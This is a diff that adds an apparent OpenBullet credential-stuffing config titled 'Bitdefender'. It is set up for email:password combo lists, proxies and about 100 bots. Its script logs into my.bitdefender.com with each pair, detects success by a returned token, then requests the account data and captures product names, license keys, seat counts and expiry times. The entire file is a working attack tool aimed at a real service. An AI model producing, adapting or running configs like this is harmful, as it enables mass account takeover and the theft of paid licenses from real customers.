@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Bitdefender",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-25T11:08:53.4751322+00:00",
+  "AdditionalInfo": "",
+  "Author": "Airbomber",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 10,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://my.bitdefender.com/lv2/account?login=<USER>&pass=<PASS>&action=login&type=userpass&fp=web" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "referer: https://my.bitdefender.com/login" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"token\"" 
+  KEYCHAIN Failure OR 
+    KEY "wrong_login" 
+
+PARSE "<SOURCE>" LR "token\": \"" "\"" -> VAR "token" 
+
+REQUEST GET "https://my.bitdefender.com/lv2/get_info?login=<USER>&token=<token>&fields=serials%2Caccount" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Product_Name PARSE "<SOURCE>" LR "\"product_name\": \"" "\"" Recursive=TRUE -> CAP "Product Name" 
+
+#Licesnse_Key PARSE "<SOURCE>" LR "\"key\": \"" "\"" Recursive=TRUE -> CAP "Key" 
+
+#Max_Computers PARSE "<SOURCE>" LR "max_computers\": " "," Recursive=TRUE -> CAP "Max Computers" 
+
+#first_time PARSE "<SOURCE>" LR "first_time\": " "," Recursive=TRUE -> CAP "First Time" 
+
+#expire_time PARSE "<SOURCE>" LR "expire_time\": " "," Recursive=TRUE -> CAP "Expire Time" 
+
